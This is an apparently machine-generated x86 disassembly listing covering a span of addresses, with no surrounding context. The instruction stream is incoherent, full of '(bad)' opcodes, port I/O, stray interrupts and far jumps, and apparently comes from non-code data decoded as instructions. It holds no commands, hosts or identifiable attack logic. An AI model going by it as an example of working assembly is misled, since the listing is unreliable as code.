  4265ec:	inc    edi
  4265ed:	in     eax,0xdf
  4265ef:	add    al,0xef
  4265f1:	stos   DWORD PTR es:[edi],eax
  4265f2:	add    cl,ah
  4265f4:	sub    esp,ebx
  4265f6:	pop    edx
  4265f7:	cmp    DWORD PTR [esi+0x33],eax
  4265fa:	sub    esp,DWORD PTR [edx+0x32bf6e4f]
  426600:	mov    esi,0xbdfa2bb
  426605:	(bad)  
  426606:	add    DWORD PTR ss:[ebp+0x3fefea34],ebp
  42660d:	js     0x4265d0
  42660f:	mov    eax,ds:0x8bc22154
  426614:	inc    eax
  426615:	std    
  426616:	xor    BYTE PTR [esp+edx*4-0x28],bh
  42661a:	mov    dh,0xe3
  42661c:	(bad)  
  42661e:	aam    0x3a
  426620:	mov    bl,0xa2
  426622:	dec    BYTE PTR [edx+0x65c9de64]
  426628:	mov    ah,0x3c
  42662a:	cmp    DWORD PTR [esi+0xa],ecx
  42662d:	lea    edx,[esi]
  42662f:	and    cl,0xde
  426632:	xchg   esi,eax
  426633:	pop    es
  426634:	(bad)  
  426635:	xchg   esp,eax
  426636:	or     eax,0xfa21836a
  42663b:	jae    0x426682
  42663d:	bound  edi,QWORD PTR [ecx]
  42663f:	jecxz  0x4265f2
  426641:	xchg   edi,eax
  426642:	mov    eax,fs:0xfd0330aa
  426648:	mov    cl,0x90
  42664a:	loopne 0x4266b4
  42664c:	arpl   WORD PTR [esi-0x29],bp
  42664f:	jns    0x4266b1
  426651:	lea    esp,[esi+0xfddddd8]
  426657:	test   BYTE PTR [edi-0x16ed2a60],0x3
  42665e:	repz push ebx
  426660:	adc    al,0x6
  426662:	cmp    DWORD PTR [eax+eiz*2],ebp
  426665:	dec    esp
  426666:	adc    dh,BYTE PTR [ebx+edi*1]
  426669:	mov    bl,0xc3
  42666b:	popa   
  42666c:	popa   
  42666d:	inc    edx
  42666e:	adc    al,0x71
  426670:	cmp    al,0xf9
  426672:	iret   
  426673:	sub    edx,ecx
  426675:	out    dx,eax
  426676:	clc    
  426677:	std    
  426678:	repnz mov dh,0xfd
  42667b:	inc    esp
  42667c:	cmp    DWORD PTR [ebx-0x32],ebx
  42667f:	es sub eax,0xd5f08db0
  426685:	(bad)  
  426687:	stos   DWORD PTR es:[edi],eax
  426688:	cmp    DWORD PTR [esi],ebx
  42668a:	test   DWORD PTR [edx-0x4a09d135],0x145d78c6
  426694:	and    ecx,DWORD PTR [ebx+0x5f]
  426697:	push   ebp
  426698:	xor    edi,DWORD PTR [esi]
  42669a:	cld    
  42669b:	pop    ecx
  42669c:	std    
  42669d:	pushf  
  42669e:	jmp    0xb53f:0x7de15018
  4266a5:	add    BYTE PTR [esp+edx*2-0x45ece22c],al
  4266ac:	imul   edx,DWORD PTR [ecx+0xf96eecb],0xcd33ebb2
  4266b6:	adc    DWORD PTR [edi+ecx*2-0x46],ebp
  4266ba:	jne    0x426661
  4266bc:	sub    al,0xb6
  4266be:	lods   al,BYTE PTR ds:[esi]
  4266bf:	sub    al,BYTE PTR [edx]
  4266c1:	push   ds
  4266c2:	pushf  
  4266c3:	pop    es
  4266c4:	pop    edx
  4266c5:	sti    
  4266c6:	int    0xc6
  4266c8:	mov    dh,0xc5
  4266ca:	lods   al,BYTE PTR ds:[esi]
  4266cb:	pop    ds
  4266cc:	cld    
  4266cd:	mov    ecx,DWORD PTR [edi+0x4c]
  4266d0:	adc    al,0x4e
  4266d2:	out    0x28,al
  4266d4:	mov    esi,0xf819e983
  4266d9:	xchg   edx,eax
  4266da:	stc    
  4266db:	adc    eax,DWORD PTR [edx-0x2db51505]
  4266e1:	push   esi
  4266e2:	daa    
  4266e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4266e4:	test   eax,0x96f34174
  4266e9:	sub    al,0xe4
  4266eb:	in     eax,dx
  4266ec:	push   ss
  4266ed:	xor    ch,cl
  4266ef:	sub    eax,0xe03be626
  4266f4:	in     eax,0xa8
  4266f6:	addr16 icebp 
  4266f8:	adc    dh,0xef
  4266fb:	fisttp WORD PTR [ecx]
  4266fd:	sbb    BYTE PTR [ecx],dh
  4266ff:	lods   eax,DWORD PTR ds:[esi]
  426700:	sbb    DWORD PTR [edi],edx
  426702:	pop    ss
  426703:	jl     0x426762
  426705:	jb     0x4266c7
  426707:	jne    0x4266bb
  426709:	hlt    
  42670a:	sbb    esi,DWORD PTR [edx-0x42fecba3]
  426710:	sbb    ebx,DWORD PTR [edi-0x27]
  426713:	lahf   
  426714:	sbb    DWORD PTR [edi],ecx
  426716:	push   es
  426717:	inc    ebx
  426718:	mov    ?,WORD PTR [ebp+0x79c587c0]
  42671e:	addr16 retw 0xf5f1
  426723:	arpl   bp,cx
  426725:	cli    
  426726:	test   eax,0xbabd6241
  42672b:	adc    dh,BYTE PTR [eax]
  42672d:	pop    edx
  42672e:	xchg   DWORD PTR [ebx-0x62],esp
  426731:	xlat   BYTE PTR ds:[ebx]
  426732:	mov    dh,al
  426734:	inc    edi
  426735:	retf   0xe0bb
  426738:	add    DWORD PTR [esi],ebp
  42673a:	sti    
  42673b:	fcmovbe st,st(6)
  42673d:	ret    
  42673e:	add    dh,al
  426740:	sar    ecx,cl
  426742:	inc    esp
  426743:	lea    edx,[ebp+esi*1+0x76eb105b]
  42674a:	cmp    al,0x99
  42674c:	aas    
  42674d:	mov    BYTE PTR [edi],ah
  42674f:	imul   edx,DWORD PTR [edx-0x2b],0xffffffba
  426753:	fldpi  
  426755:	xchg   DWORD PTR [ecx],edi
  426757:	mov    ch,0x8a
  426759:	mov    edx,DWORD PTR [edx+0x4b]
  42675c:	pop    es
  42675d:	(bad)
  426760:	shl    BYTE PTR [ebp+0x12],cl
  426763:	retf   
  426764:	dec    edi
  426765:	rol    BYTE PTR [esi+0x17],0x4e
  426769:	jmp    0x426740
  42676b:	jb     0x426781
  42676d:	mov    eax,ds:0x20c2a6a7
  426772:	xor    ch,dl
  426774:	outs   dx,DWORD PTR ds:[esi]
  426775:	push   eax
  426776:	dec    esp
  426777:	mov    al,BYTE PTR [esi-0xb9d0b41]
  42677d:	ins    BYTE PTR es:[edi],dx
  42677e:	lods   al,BYTE PTR ds:[esi]
  42677f:	scas   al,BYTE PTR es:[edi]
  426780:	fwait
  426781:	adc    BYTE PTR [ebx-0x77],ch
  426784:	or     al,0x62
  426786:	cdq    
  426787:	test   DWORD PTR [edx],esp
  426789:	dec    eax
  42678a:	mov    bh,0x55
  42678c:	mov    ebp,0x1d771e3b
  426791:	jg     0x4267d5
  426793:	ins    BYTE PTR es:[edi],dx
  426794:	cmp    eax,0xcdc4aaa6
  426799:	pop    esi
  42679a:	pusha  
  42679b:	dec    esp
  42679c:	clc    
  42679d:	sbb    BYTE PTR [edi+0x6cbe0799],0x1e
  4267a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4267a5:	lock mov al,0x58
  4267a8:	mov    bh,0x6c
  4267aa:	mov    dl,0xa1
  4267ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
	...
  4267b9:	add    BYTE PTR [eax-0x57e1776],dh
  4267bf:	jecxz  0x4267ba
  4267c1:	mov    ebx,0xcae72888
  4267c6:	retf   0x5b00
  4267c9:	push   edi
  4267ca:	and    bl,dh
  4267cc:	add    DWORD PTR [eax],eax
  4267ce:	sti    
  4267cf:	add    DWORD PTR [eax],eax
  4267d1:	add    dh,ch
  4267d3:	ins    DWORD PTR es:[edi],dx
  4267d4:	dec    esi
  4267d5:	cdq    
  4267d6:	push   0x67
  4267d8:	pop    ebp
  4267d9:	clc    
  4267da:	(bad)  
  4267db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4267dc:	xlat   BYTE PTR ds:[ebx]
  4267dd:	push   esp
  4267de:	cdq    
  4267df:	push   eax
  4267e0:	pushf  
  4267e1:	fs data16 jo 0x426853
  4267e5:	cli    
  4267e6:	mov    esp,0x224a8b7
  4267eb:	retf   
  4267ec:	push   esp
  4267ed:	dec    ebp
  4267ee:	pop    edi
  4267ef:	dec    edx
  4267f0:	push   esp
  4267f1:	xor    DWORD PTR [ecx+0x4b513002],esi
  4267f7:	xchg   edi,eax
  4267f8:	xor    edx,eax
  4267fa:	push   ecx
  4267fb:	xchg   BYTE PTR [ebx+0x6b],al
  4267fe:	dec    esp
  4267ff:	sub    edx,DWORD PTR [eax+ecx*1+0x21]
  426803:	cmp    DWORD PTR [edx],ebp
  426805:	push   ds
  426806:	mov    bh,0xc7
  426808:	or     eax,0xd2dbc158
  42680d:	mov    ds:0xc96dbbb4,eax
  426812:	cmp    DWORD PTR [ebp+0x6f],ecx
  426815:	and    esi,DWORD PTR [ebx]
  426817:	xchg   edx,edx
  426819:	loopne 0x4267b5
  42681b:	cdq    
  42681c:	push   0xfffffff8
  42681e:	jo     0x426833
  426820:	pop    eax
  426821:	or     BYTE PTR [edi+0x17],ah
  426824:	aam    0x89
  426826:	ret    0xf91d
  426829:	aaa    
  42682a:	xchg   BYTE PTR [edx+0x3e0ea57],al
  426830:	xchg   ebp,eax
  426831:	leave  
  426832:	mov    WORD PTR [ecx],es
  426834:	cld    
  426835:	jns    0x42688c
  426837:	int    0x83
  426839:	lock out 0x61,eax
  42683c:	push   eax
  42683d:	xor    al,0x3e
  42683f:	pop    eax
  426840:	loope  0x42687c
  426842:	mov    dl,0x2e
  426844:	imul   eax,DWORD PTR [esi],0x59
  426847:	stos   BYTE PTR es:[edi],al
  426848:	aam    0xf9
  42684a:	call   0x1760:0x2e597713
  426851:	xlat   BYTE PTR ds:[ebx]
  426852:	jmp    DWORD PTR [ecx]
  426854:	xchg   ebx,eax
  426855:	or     DWORD PTR [edi],edi
  426857:	dec    ecx
  426858:	xchg   ebx,eax
  426859:	jecxz  0x426853
  42685b:	packssdw mm7,QWORD PTR [edi]
  42685e:	jp     0x42683b
  426860:	jbe    0x4268cb
  426862:	sub    edi,edi
  426864:	hlt    
  426865:	mov    dh,0xc3
  426867:	fwait
  426868:	push   cs
  426869:	loope  0x42682c
  42686b:	mov    DWORD PTR [edx-0x43cbb2e1],0x8df5fff2
  426875:	jecxz  0x426820
  426877:	sahf   
  426878:	mov    al,ds:0x8cea8e5e
  42687d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42687e:	xchg   esp,eax
  42687f:	daa    
  426880:	int    0x8f
  426882:	fldenv gs:[ebp+eiz*4+0x1412c197]
  42688a:	push   eax
  42688b:	and    DWORD PTR [edi-0x37],ebx
  42688e:	leave  
  42688f:	fimul  DWORD PTR [ebp+0x3e]
  426892:	popa   
  426893:	or     ah,BYTE PTR [ebp-0x1d22481a]
  426899:	nop
  42689a:	add    eax,0xee9a49dc
  42689f:	dec    ebx
  4268a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268a1:	pop    edi
  4268a2:	ret    
  4268a3:	mov    al,0xbf
  4268a5:	dec    esp
  4268a6:	mov    ds:0x9fa49638,eax
  4268ab:	retf   0x2748
  4268ae:	aaa    
  4268af:	mov    dl,0x50
  4268b1:	sub    DWORD PTR [edi-0x51c02880],edx
  4268b7:	pop    ebx
  4268b8:	int    0x6f
  4268ba:	add    BYTE PTR ss:[esp+esi*2-0x642cd45f],al
  4268c2:	cld    
  4268c3:	cmp    eax,0x81379102
  4268c8:	call   0xdd820733
  4268cd:	sbb    edi,DWORD PTR ds:0x98662b25
  4268d3:	mov    al,0x65
  4268d5:	mov    eax,0x32c40b35
  4268da:	jl     0x4268ae
  4268dc:	iret   
  4268dd:	out    dx,al
  4268de:	aam    0x47
  4268e0:	jecxz  0x4268fd
  4268e2:	rol    BYTE PTR [esi],0x57
  4268e5:	test   DWORD PTR [edx-0x33],edx
  4268e8:	jns    0x4268ea
  4268ea:	fidiv  DWORD PTR [esi-0x4398dd50]
  4268f0:	loope  0x426890
  4268f2:	leave  
  4268f3:	cli    
  4268f4:	ret    0xc763
  4268f7:	mov    al,ds:0xaa572c8b
  4268fc:	xor    al,0x1c
  4268fe:	mov    eax,ds:0xf8208efa
  426903:	lea    esi,[edi-0x25]
  426906:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426907:	and    dh,0xd7
  42690a:	sbb    cl,BYTE PTR [eax]
  42690c:	pop    DWORD PTR [ebx+0x63]
  42690f:	pop    esi
  426910:	mov    eax,0x55a2a17c
  426915:	xchg   BYTE PTR [ebx],cl
  426917:	daa    
  426918:	and    cl,0xb5
  42691b:	cmp    bh,BYTE PTR [ecx-0x1493fe9d]
  426921:	cmp    al,0xf9
  426923:	sbb    BYTE PTR [ecx-0x784b5410],ch
  426929:	test   al,0xa0
  42692b:	jl     0x426964
  42692d:	or     eax,0x393d5530
  426932:	pop    esp
  426933:	loopne 0x4268c4
  426935:	mov    ds:0x94c440f8,eax
  42693a:	mov    ecx,0xf4b304cb
  42693f:	mov    dh,0xa5
  426941:	mov    BYTE PTR [esi-0x7b],0x5a
  426945:	sub    al,BYTE PTR [esi-0x1df0dbca]
  42694b:	pop    esi
  42694c:	pop    ebx
  42694d:	test   DWORD PTR [edi],ecx
  42694f:	pushf  
  426950:	push   edi
  426951:	sahf   
  426952:	inc    edx
  426953:	mov    edx,gs
  426955:	dec    DWORD PTR [eax-0x38]
  426958:	(bad)  
  426959:	in     al,0x22
  42695b:	daa    
  42695c:	mov    esp,0x65f1594c
  426961:	cdq    
  426962:	sahf   
  426963:	cs cmp bl,cl
  426966:	mov    ?,WORD PTR [ecx-0x49256eae]
  42696c:	add    al,0xdb
  42696e:	cs (bad) 
  426970:	shl    BYTE PTR [ebx+0x331b92c8],cl
  426976:	push   ss
  426977:	mov    ah,0xe0
  426979:	mov    al,0xf1
  42697b:	idiv   BYTE PTR [ebp-0x63c5656d]
  426981:	inc    esp
  426982:	cmp    ebp,ebx
  426984:	jp     0x4269aa
  426986:	push   es
  426987:	mov    al,0x23
  426989:	arpl   WORD PTR [edi],cx
  42698b:	add    DWORD PTR [ecx-0x6a987f32],edx
  426991:	inc    ebx
  426992:	mov    ebp,0xbda2281c
  426997:	mov    ecx,0x90f7a124
  42699c:	add    BYTE PTR [esi+0x2578c146],al
  4269a2:	pop    ds
  4269a3:	repnz in eax,0x9c
  4269a6:	aam    0x3a
  4269a8:	xor    eax,0x61231998
  4269ad:	inc    esp
  4269ae:	retf   0x5d2
  4269b1:	les    edi,FWORD PTR [ebp-0x3799ca9c]
  4269b7:	and    ebx,DWORD PTR [edi+0x25229a21]
  4269bd:	cmp    DWORD PTR [ebp+0x21b5edae],ebp
  4269c3:	je     0x426a03
  4269c5:	push   esp
  4269c6:	stc    
  4269c7:	cmp    BYTE PTR ss:0x1313bb,ch
	...
  4269da:	mov    cl,BYTE PTR [esp+eax*8-0x61253926]
  4269e1:	fcomp  QWORD PTR [edi+0x23]
  4269e4:	or     al,0x8a
  4269e6:	cmc    
  4269e7:	sti    
  4269e8:	clc    
  4269e9:	addr16 sbb eax,0xfb0001e0
  4269ef:	add    DWORD PTR [eax],eax
  4269f1:	add    BYTE PTR [esi-0x4803328d],al
  4269f7:	mov    ebx,0xd8313b2e
  4269fc:	std    
  4269fd:	xlat   BYTE PTR ds:[ebx]
  4269fe:	mov    ebx,0xc3ac4b01
  426a03:	cmc    
  426a04:	and    al,0xe6
  426a06:	ins    DWORD PTR es:[edi],dx
  426a07:	jne    0x426a51
  426a09:	mov    al,dl
  426a0b:	rcr    DWORD PTR gs:[edi],1
  426a0e:	inc    eax
  426a0f:	xchg   edx,eax
  426a10:	mov    es,WORD PTR [eax]
  426a12:	cwde   
  426a13:	pop    ecx
  426a14:	inc    ebp
  426a15:	(bad)  
  426a16:	sahf   
  426a17:	push   edi
  426a18:	jno    0x4269e6
  426a1a:	jecxz  0x426a5e
  426a1c:	dec    ebx
  426a1d:	iret   
  426a1e:	pushf  
  426a1f:	inc    esp
  426a20:	aad    0xd5
  426a22:	mov    WORD PTR [edi-0x14],es
  426a25:	das    
  426a26:	imul   edx,DWORD PTR [ebp+0x4026b9ae],0x11513046
  426a30:	jl     0x4269c5
  426a32:	pusha  
  426a33:	stos   BYTE PTR es:[edi],al
  426a34:	mov    eax,0x82159501
  426a39:	xor    ch,BYTE PTR [edi+0x32]
  426a3c:	pop    edi
  426a3d:	dec    edi
  426a3e:	fwait
  426a3f:	hlt    
  426a40:	mov    ?,WORD PTR [ebp+0x3]
  426a43:	sub    dl,ch
  426a45:	mov    ebp,0xd4356ed4
  426a4a:	inc    ebx
  426a4b:	inc    esi
  426a4c:	in     al,0x4d
  426a4e:	sbb    BYTE PTR [ecx-0x79be3cc8],0x3c
  426a55:	mov    edi,0x9c4af3d7
  426a5a:	pushf  
  426a5b:	push   es
  426a5c:	sbb    ecx,DWORD PTR [edx+0x58ad6355]
  426a62:	push   edx
  426a63:	ficom  WORD PTR [edi-0x7700bdb4]
  426a69:	push   es
  426a6a:	sbb    BYTE PTR [ebx+0x16887e95],ah
  426a70:	mov    al,ds:0x789d627d
  426a75:	jmp    0x4cd3:0x616a1ef7
  426a7c:	pusha  
  426a7d:	mov    esi,0x71138cd6
  426a82:	xchg   ecx,eax
  426a83:	pop    eax
  426a84:	cld    
  426a85:	ret    0xc540
  426a88:	mov    BYTE PTR [esi-0x20],0xa5
  426a8c:	jl     0x426aa3
  426a8e:	inc    esi
  426a8f:	xchg   ebp,eax
  426a90:	in     eax,dx
  426a91:	fidiv  WORD PTR [eax]
  426a93:	pop    eax
  426a94:	ror    BYTE PTR [edi-0x74],cl
  426a97:	jb     0x426ab5
  426a99:	(bad)  
  426a9a:	sahf   
  426a9b:	and    BYTE PTR [esi],0xd4
  426a9e:	test   BYTE PTR [esi+0x7589f4a5],cl
  426aa4:	out    0x7c,al
  426aa6:	sub    al,0x46
  426aa8:	aaa    
  426aa9:	popf   
  426aaa:	aam    0x2d
  426aac:	in     eax,0x4a
  426aae:	dec    ebx
  426aaf:	mov    ah,0xec
  426ab1:	mov    ebp,0xc5d581ec
  426ab6:	ins    BYTE PTR es:[edi],dx
  426ab7:	pop    esp
  426ab8:	arpl   WORD PTR [edi+0x3b12d5e6],ax
  426abe:	cmp    edi,edx
  426ac0:	cs adc eax,0x139d6b97
  426ac6:	xor    ch,bl
  426ac8:	jmp    0x9f518657
  426acd:	iret   
  426ace:	push   ecx
  426acf:	adc    DWORD PTR [edx],esp
  426ad1:	iret   
  426ad2:	in     eax,0xf3
  426ad4:	sbb    DWORD PTR [ebp+0x66],ecx
  426ad7:	mov    al,ds:0x5ec30778
  426adc:	cwde   
  426add:	adc    edx,ebp
  426adf:	push   ebx
  426ae0:	pop    esp
  426ae1:	push   edx
  426ae2:	leave  
  426ae3:	cld    
  426ae4:	enter  0x53,0x34
  426ae8:	fcmove st,st(6)
  426aea:	in     eax,0x9f
  426aec:	gs jbe 0x426af5
  426aef:	add    dl,BYTE PTR [esi+0x12]
  426af2:	sbb    al,0x3b
  426af4:	or     BYTE PTR [eax-0x5376b8ea],dl
  426afa:	xor    eax,DWORD PTR [esi+0x7a]
  426afd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426afe:	mov    eax,ds:0x5f41f51
  426b03:	ja     0x426abb
  426b05:	sbb    esi,DWORD PTR [ebx]
  426b07:	or     dh,bl
  426b09:	sbb    DWORD PTR [esi-0x299e1431],edi
  426b0f:	mov    WORD PTR [edi-0x508f2585],?
  426b15:	add    eax,0xbc072be
  426b1a:	jmp    0x6c8dd3e5
  426b1f:	pop    esp
  426b20:	jno    0x426b5f
  426b22:	out    dx,al
  426b23:	fisub  WORD PTR [ebx+0x209e19df]
  426b29:	push   ebx
  426b2a:	inc    edi
  426b2b:	add    DWORD PTR [edx-0x1796ff59],ecx
  426b31:	cld    
  426b32:	or     al,0xd6
  426b34:	sub    DWORD PTR [ebp+0x635f30c3],0xfa39693f
  426b3e:	mov    ah,0x12
  426b40:	sar    edi,1
  426b42:	pop    ebp
  426b43:	xlat   BYTE PTR ds:[ebx]
  426b44:	popa   
  426b45:	xor    bh,BYTE PTR [ecx+0x3f]
  426b48:	pop    ebx
  426b49:	stc    
  426b4a:	mov    cl,dl
  426b4c:	std    
  426b4d:	inc    edx
  426b4e:	cld    
  426b4f:	inc    edx
  426b50:	pop    ebx
  426b51:	mov    dh,0x45
  426b53:	sub    al,0xe1
  426b55:	sti    
  426b56:	je     0x426b5f
  426b58:	jmp    0xc39e:0xee4d149e
  426b5f:	ficomp DWORD PTR [edi-0x7846516c]
  426b65:	pop    ebx
  426b66:	sub    BYTE PTR [edi],0xae
  426b69:	std    
  426b6a:	mov    edi,0x353539f4
  426b6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426b70:	xchg   BYTE PTR [edi+0x12],dl
  426b73:	retf   0x16cf
  426b76:	rcl    DWORD PTR ds:0xf2e44b88,cl
  426b7c:	dec    edi
  426b7d:	lock mov al,0xb1
  426b80:	cmp    ah,dh
  426b82:	or     eax,0x61533b0a
  426b87:	xchg   bh,bl
  426b89:	stos   BYTE PTR es:[edi],al
  426b8a:	jno    0x426bb8
  426b8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426b8d:	rcr    DWORD PTR [edx+0x3727bdaa],0x9e
  426b94:	test   BYTE PTR [edi-0x6e],dh
  426b97:	les    ecx,FWORD PTR [ebp+edx*4+0x7b]
  426b9b:	in     eax,dx
  426b9c:	js     0x426c09
  426b9e:	inc    ecx
  426b9f:	inc    ebx
  426ba0:	imul   edi,DWORD PTR [ecx-0xf],0xffffffd4
  426ba4:	mov    al,0xf6
  426ba6:	adc    eax,esp
  426ba8:	ret    
  426ba9:	xchg   esi,eax
  426baa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426bab:	out    0x5d,al
  426bad:	cld    
  426bae:	jge    0x426b9f
  426bb0:	pop    edx
  426bb1:	fisttp QWORD PTR [ebx*1-0x61b32d0b]
  426bb8:	hlt    
  426bb9:	push   ds
  426bba:	sar    DWORD PTR [ebx+0x7b948119],0xf0
  426bc1:	inc    ebx
  426bc2:	icebp  
  426bc3:	gs aaa 
  426bc5:	ds daa 
  426bc7:	jns    0x426b72
  426bc9:	ss pop eax
  426bcb:	adc    dl,BYTE PTR [ebx]
  426bcd:	stos   DWORD PTR es:[edi],eax
  426bce:	jns    0x426c21
  426bd0:	push   ds
  426bd1:	sahf   
  426bd2:	push   edx
  426bd3:	test   eax,0x768067e1
  426bd8:	or     dl,bl
  426bda:	std    
  426bdb:	in     eax,dx
  426bdc:	add    cl,ch
  426bde:	rcl    DWORD PTR [esi-0x61f63173],1
  426be4:	outs   dx,BYTE PTR ds:[esi]
  426be5:	gs dec ebx
  426be7:	jle    0x426bb4
  426be9:	inc    edx
  426bea:	jg     0x426c07
  426bec:	xor    eax,DWORD PTR [eax]
	...
  426bfa:	inc    eax
  426bfb:	stos   BYTE PTR es:[edi],al
  426bfc:	pop    edx
  426bfd:	sbb    bh,dl
  426bff:	cli    
  426c00:	inc    eax
  426c01:	cli    
  426c02:	mov    ds:0xc6fe433f,al
  426c07:	mov    bh,0xf3
  426c09:	jl     0x426c23
  426c0b:	loop   0x426c0e
  426c0d:	add    bl,bh
  426c0f:	add    DWORD PTR [eax],eax
  426c11:	add    BYTE PTR [ebx-0x60],bl
  426c14:	out    dx,al
  426c15:	cld    
  426c16:	ret    0xe023
  426c19:	div    DWORD PTR cs:[ebp-0x69]
  426c1d:	xchg   edi,eax
  426c1e:	aam    0x91
  426c20:	push   eax
  426c21:	cwde   
  426c22:	outs   dx,DWORD PTR ds:[esi]
  426c23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426c24:	jmp    0x22a0:0xc0e696cc
  426c2b:	jnp    0x426ca6
  426c2d:	mov    esp,0xa58c7e40
  426c32:	xchg   edx,eax
  426c33:	out    0xe3,eax
  426c35:	scas   al,BYTE PTR es:[edi]
  426c36:	xor    BYTE PTR [esi+ebx*8],0x90
  426c3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426c3b:	js     0x426bdc
  426c3d:	retf   
  426c3e:	push   ebx
  426c3f:	add    DWORD PTR [ebp-0xc07b71],0x7323f328
  426c49:	mov    ebp,0x2f838cdb
  426c4e:	mov    ah,0xaa
  426c50:	mov    eax,0x97b5f514
  426c55:	xchg   esp,eax
  426c56:	not    BYTE PTR [edi-0x23]
  426c59:	outs   dx,BYTE PTR ds:[esi]
  426c5a:	mov    cl,0xfd
  426c5c:	push   ecx
  426c5d:	inc    ebx
  426c5e:	jno    0x426c99
  426c60:	aas    
  426c61:	scas   al,BYTE PTR es:[edi]
  426c62:	push   ecx
  426c63:	sbb    eax,0xe5c69806
  426c68:	pop    es
  426c69:	mov    esp,0xded8cd67
  426c6e:	imul   ebx,DWORD PTR [esi+0x4a],0x67
  426c72:	mov    ds:0xa14f964f,eax
  426c77:	icebp  
  426c78:	in     eax,dx
  426c79:	mov    dh,BYTE PTR [edx]
  426c7b:	mov    WORD PTR [edi-0x3cc9bfc9],cs
  426c81:	push   0xffffffc9
  426c83:	inc    DWORD PTR [esi]
  426c85:	(bad)  
  426c86:	retf   0x4e2f
  426c89:	jg     0x426c9b
  426c8b:	mov    ah,0x94
  426c8d:	dec    ebp
  426c8e:	pop    ebp
  426c8f:	jp     0x426c6e
  426c91:	into   
  426c92:	cli    
  426c93:	xor    eax,0x1f4260bd
  426c98:	fdivr  DWORD PTR [ecx-0x7a]
  426c9b:	mov    BYTE PTR [edx-0x5a9ead65],dl
  426ca1:	and    DWORD PTR [edi-0x65],edi
  426ca4:	jg     0x426d1b
  426ca6:	retf   
  426ca7:	jmp    0xc1ca:0x8c3483e2
  426cae:	jmp    0xbd494e3e
  426cb3:	pop    es
  426cb4:	push   ecx
  426cb5:	xchg   edx,eax
  426cb6:	jnp    0x426ceb
  426cb8:	push   edi
  426cb9:	sub    al,0x7b
  426cbb:	jg     0x426d14
  426cbd:	dec    ebx
  426cbe:	nop
  426cbf:	lods   al,BYTE PTR ds:[esi]
  426cc0:	or     ebp,DWORD PTR [edi]
  426cc2:	sahf   
  426cc3:	inc    ecx
  426cc4:	xchg   esi,eax
  426cc5:	sub    al,0x92
  426cc7:	icebp  
  426cc8:	fyl2x  
  426cca:	cmp    al,0x25
  426ccc:	and    ch,bl
  426cce:	lahf   
  426ccf:	push   esi
  426cd0:	add    BYTE PTR [esi-0x74],0xbd
  426cd4:	daa    
  426cd5:	or     bl,BYTE PTR [edx+edi*4+0x6d]
  426cd9:	sar    esp,0xde
  426cdc:	scas   eax,DWORD PTR es:[edi]
  426cdd:	jb     0x426c88
  426cdf:	and    edx,DWORD PTR [ebx-0x39]
  426ce2:	fadd   DWORD PTR [ebx+0x49]
  426ce5:	outs   dx,DWORD PTR ds:[esi]
  426ce6:	jl     0x426d36
  426ce8:	aad    0xca
  426cea:	dec    eax
  426ceb:	jnp    0x426cf6
  426ced:	cmp    BYTE PTR [ebp+0x42],dh
  426cf0:	mov    edi,0x72cc02ca
  426cf5:	imul   DWORD PTR [esi+eax*2]
  426cf8:	xchg   esp,eax
  426cf9:	sbb    DWORD PTR [eax+0x20],0x1384418f
  426d00:	fist   WORD PTR gs:[esi+0x1d7dbcff]
  426d07:	mov    cl,0x9c
  426d09:	mov    ebp,gs
  426d0b:	out    0x29,eax
  426d0d:	clc    
  426d0e:	jg     0x426ca2
  426d10:	jb     0x426d7a
  426d12:	test   DWORD PTR [edi],0xf18732dc
  426d18:	retf   
  426d19:	sub    ebx,DWORD PTR [eax-0x76]
  426d1c:	mov    cl,0x6
  426d1e:	sbb    ah,BYTE PTR [edx]
  426d20:	mov    BYTE PTR [esi],ah
  426d22:	mov    ah,0x39
  426d24:	(bad)  
  426d25:	(bad)  
  426d26:	fcmovnbe st,st(2)
  426d28:	xor    BYTE PTR [esi],ah
  426d2a:	sub    eax,0xabd4b2f1
  426d2f:	jge    0x426cb2
  426d31:	xchg   ebx,eax
  426d32:	aaa    
  426d33:	ret    
  426d34:	xchg   ebp,eax
  426d35:	test   esp,0xecc9e6bb
  426d3b:	mov    ds:0xfa50ce53,al
  426d40:	mov    ds:0xb8176f9c,eax
  426d45:	cmp    BYTE PTR [edx],dh
  426d47:	pop    esi
  426d48:	jmp    0x24ce:0xbca56ebe
  426d4f:	pop    ebx
  426d50:	je     0x426d7f
  426d52:	add    al,0xd4
  426d54:	lods   eax,DWORD PTR ds:[esi]
  426d55:	adc    eax,0x9941b9e0
  426d5a:	fs sti 
  426d5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426d5d:	ja     0x426dce
  426d5f:	xor    BYTE PTR [esi-0x6d677cd5],0x93
  426d66:	leave  
  426d67:	sub    eax,0x58d3efa9
  426d6c:	fsubr  DWORD PTR [esi+0x61efb924]
  426d72:	fwait
  426d73:	pop    edi
  426d75:	jnp    0x426dd8
  426d77:	adc    dh,dh
  426d79:	mov    dh,0xf3
  426d7b:	mov    ebp,0x6ea4f5cc
  426d80:	outs   dx,BYTE PTR ds:[esi]
  426d81:	inc    esp
  426d82:	and    BYTE PTR [ebx+0x685c918d],dh
  426d88:	aas    
  426d89:	pop    ss
  426d8a:	cmp    al,0x6c
  426d8c:	ins    DWORD PTR es:[edi],dx
  426d8d:	pop    ds
  426d8e:	into   
  426d8f:	icebp  
  426d90:	retf   
  426d91:	cmp    eax,0x3f279c13
  426d96:	sbb    ch,BYTE PTR [ebp-0x3d]
  426d99:	push   ebx
  426d9a:	mov    bl,0xc3
  426d9c:	jbe    0x426d96
  426d9e:	in     al,dx
  426d9f:	push   ss
  426da0:	mov    BYTE PTR [edx+0x124f94e0],dl
  426da6:	jmp    0x2d88:0x82567917
  426dad:	mov    ch,0xe9
  426daf:	cli    
  426db0:	in     eax,dx
  426db1:	pop    edi
  426db2:	jge    0x426dbe
